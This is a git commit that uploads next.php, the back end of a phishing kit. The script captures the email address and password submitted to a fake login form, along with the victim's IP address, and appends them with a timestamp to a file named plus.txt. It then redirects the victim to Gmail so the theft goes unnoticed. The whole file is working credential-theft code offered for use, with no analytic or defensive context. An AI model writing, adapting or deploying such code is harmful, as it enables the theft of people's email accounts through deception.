f96c4f495c6fd3939d7e3a91482fc4002b5f2ecc
webmailserver <106559552+webmailserver@users.noreply.github.com>
2022-06-03 02:13:36 +0100

    Add files via upload

---
+++ next.php
@@ -0,0 +1,23 @@
+<?php
+//AngryMan
+$user=$_POST['email'];
+$pass=$_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+
+
+echo "Loading...!";
+
+
+$info= "**********************\n" . $user . "\n" . $pass . "\n" . $ip . "\n" . date("l jS \of F Y") . "\n" . date("h:i:sa") . "\n**********************\n\n";
+
+
+$fp = fopen('plus.txt', 'a');//opens file in append mode  
+fwrite($fp,$info);  
+
+fclose($fp);  
+  
+
+
+?>
+
+<meta http-equiv="Refresh" content="1; url=https://www.gmail.com/">
